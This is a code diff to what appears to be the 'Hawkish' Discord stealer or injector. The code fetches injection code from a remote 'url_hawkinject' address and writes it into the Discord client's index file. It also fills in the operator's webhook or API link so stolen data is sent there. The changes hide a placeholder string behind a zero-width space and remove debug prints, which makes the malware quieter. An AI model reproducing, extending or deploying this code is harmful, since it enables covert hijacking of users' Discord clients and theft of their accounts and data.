@@ -1249,7 +1249,7 @@ class hwkish_first_funct(Functions):
 
                 with open(main_file, 'r') as f:
                     filedata = f.read()
-                    if self.apilink != "%API_"+ "LINK%" and self.apilink != "" and self.apilink != " ":
+                    if self.apilink != "%\u200BAPI_LINK%" and self.apilink != "" and self.apilink != " ":
                         newdata = filedata.replace('%API_URL%', self.apilink)
                     else:
                         newdata = filedata.replace('%WEBHOOK%', self.thishawk_webh)
@@ -1258,7 +1258,7 @@ class hwkish_first_funct(Functions):
                     f.close()
                 with open(main_file2, 'r') as f:
                     filedata = f.read()
-                    if self.apilink != "%API_"+ "LINK%" and self.apilink != "" and self.apilink != " ":
+                    if self.apilink != "%\u200BAPI_LINK%" and self.apilink != "" and self.apilink != " ":
                         newdata = filedata.replace('%API_URL%', self.apilink)
                     else:
                         newdata = filedata.replace('%WEBHOOK%', self.thishawk_webh)
@@ -1412,7 +1412,6 @@ class hwkish_first_funct(Functions):
                             pass
                     if self.webapi_find in self.thishawk_webh:
                         core_asar = self.find_in_config("url_hawkinject")
-                        print(core_asar)
                         try:
                             f = httpx.get(core_asar).text
                             if self.apilink != "%API_"+ "LINK%" and self.apilink != "" and self.apilink != " ":
@@ -1429,7 +1428,6 @@ class hwkish_first_funct(Functions):
                             pass
                     try:
                         with open(idx_path, "w", errors="ignore", newline="") as indexdiscfile:
-                            print(f)
                             indexdiscfile.write(f.rstrip('\r\n'))
                     except PermissionError:
                         pass
